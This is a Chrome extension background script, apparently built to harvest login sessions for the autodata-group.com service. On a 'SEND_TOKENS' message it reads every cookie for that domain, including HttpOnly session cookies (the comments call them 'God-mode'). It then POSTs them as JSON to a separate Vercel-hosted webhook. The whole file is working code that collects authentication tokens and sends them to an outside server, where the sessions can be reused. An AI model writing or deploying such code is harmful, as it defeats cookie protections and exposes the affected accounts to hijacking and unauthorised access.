chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "SEND_TOKENS") {
        // Grab all HttpOnly login cookies from the browser directly natively via Chrome API
        chrome.cookies.getAll({ domain: "autodata-group.com" }, (cookies) => {
            const backgroundRawCookies = cookies.map(c => `${c.name}=${c.value}`).join("; ");

            // Overwrite the limited `rawCookies` mapped by content.js with the God-mode HttpOnly ones
            const payload = {
                ...message.data,
                rawCookies: backgroundRawCookies
            };

            fetch("https://mot-reminder-quick.vercel.app/api/webhooks/autodata", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
                .then(res => res.json())
                .then(data => console.log("Tokens securely saved on backend!", data))
                .catch(err => console.error("Failed to sync tokens:", err));
        });
    }
});
